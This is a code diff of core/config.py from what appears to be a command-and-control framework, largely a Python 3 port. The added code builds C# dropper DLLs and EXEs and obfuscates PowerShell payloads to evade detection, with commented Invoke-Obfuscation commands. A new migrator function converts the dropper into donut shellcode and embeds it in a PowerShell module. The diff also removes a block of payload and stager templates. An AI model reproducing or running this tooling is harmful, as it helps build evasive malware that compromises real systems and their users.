@@ -1,10 +1,12 @@
 # Embedded file name: core\config.py
-from Encryption import generate_key
+from core.Encryption import generate_key
+from core.Obfuscate import *
 import os, base64, random, codecs, glob, readline, re
 from Crypto import Random
 import subprocess
 import string
-import config
+import core.config
+
 PORT = '{PORT}'
 VERSION = '1.1'
 AGENTS = dict()
@@ -24,26 +26,6 @@ beacon='{beacon_time}'
 AESKey=base64.b64encode(bytearray("".join([random.choice(string.ascii_uppercase) for i in range(32)]), "UTF-8")).decode()
 
 {URL}
-"""
-raw_payload={raw}
-b52_payload={b52payload}
-b64_stager={b64stager}
-b52_stager={b52stager}
-hjf_payload={hjf}
-b64_payload={b64payload}
-hjfs_payload={hjfs}
-sct_payload={sct}
-hta_payload={hta}
-register_url={register}
-download_url={download}
-upload_url={upload}
-image_url={image}
-command_url={cmd}
-result_url={re}
-modules_url={md}
-"""
-#.replace('{raw}', raw_payload).replace('{b52payload}', b52_payload).replace('{b64stager}', b64_stager).replace('{b52payload}', b52_payload).replace('{hjf}', hjf_payload).replace('{hjfs}', hjfs_payload).replace('{sct}', sct_payload).replace('{hta}', hta_payload)
-
 
 
 def PAYLOAD():
@@ -90,20 +72,61 @@ def cspayload():
     dll="mono-csc -r:lib/System.Management.Automation.dll payloads/cs_dropper.cs -out:payloads/dropper_cs.dll -target:library -warn:2"
     try:
         subprocess.check_output(dll, shell=True)
-        print "C# Dropper DLL written to: payloads/payload_cs.dll"
+        print ("C# Dropper DLL written to: payloads/payload_cs.dll")
     except Exception as e:
-        print '[-] ERROR generating csharp payload : %s' % str(e)
+        print ('[-] ERROR generating csharp payload : %s' % str(e))
     try:
         subprocess.check_output(exe, shell=True)
-        print "C# Dropper EXE written to: payloads/dropper_cs.exe"
+        print ("C# Dropper EXE written to: payloads/dropper_cs.exe")
     except Exception as e:
-        print '[-] ERROR generating csharp payload : %s' % str(e)
+        print ('[-] ERROR generating csharp payload : %s' % str(e))
+
+def obfuscate():
+    global obfuscated
+    #cmd="""pwsh -c \"./Out-ObfuscatedStringCommand.ps1;Out-ObfuscatedStringCommand -Path payloads/raw_payload.ps1 -ObfuscationLevel 3 > payloads/payload-obf.ps1\" """
+    #cmd="""pwsh -c \"Import-Module ./lib/Invoke-Obfuscation/Invoke-Obfuscation.psd1;Out-EncodedBinaryCommand -Path payloads/raw_payload.ps1 -NoProfile -NonInteractive -PassThru > payloads/payload-obf.ps1\" """
+    try:
+        #subprocess.check_output(cmd, shell=True)
+        f=open("payloads/raw_payload.ps1","rb")
+        payload=f.read()
+        f=open("payloads/payload-obf.ps1","w")
+        f.write(obfvar(payload.decode("UTF-8")))
+        f.close()
+        print("obfuscated payload written to: payloads/payload-obf.ps1")
+        #obfuscated=True
+    except Exception as e:
+        print ('[-] ERROR generating obfuscated payload : %s' % str(e))
+
+
+def Obfuscated_PAYLOAD():
+    f=open("payloads/raw_payload.ps1","rb")
+    payload=f.read()
+    return obfvar(payload.decode("UTF-8"))
+    """
+    if obfuscated==True:
+        f=open("payloads/payload-obf.ps1","rb")
+        payload=f.read()
+        return payload
+    else:
+
+        return obfuscate()
+    """
+
+
+def migrator():
+    shellcode=donut.create(file="payloads/dropper_cs.exe")
+    fp = open('agents/Migrator.ninja', 'r')
+    temp = fp.read()
+    temp=temp.replace('{shellcode}',base64.b64encode(shellcode).decode("utf-8")).replace('{class}',"".join([random.choice(string.ascii_uppercase) for i in range(5)]))
+    output=open('Modules/Migrator.ps1', 'w')
+    output.write(temp)
+    output.close()
 
 def csobf(str):
     d=""
     for i in str:
         d=d+chr((ord(i)+10)^50)
-    return base64.b64encode(d)
+    return base64.b64encode(bytearray(d,"UTF-8")).decode("UTF-8")
 
 def set_port(in_port):
     global PORT
@@ -135,4 +158,4 @@ def get_pointer():
 def set_key():
     global AESKey
     AESKey=generate_key()
-    print  AESKey
+    #print  AESKey
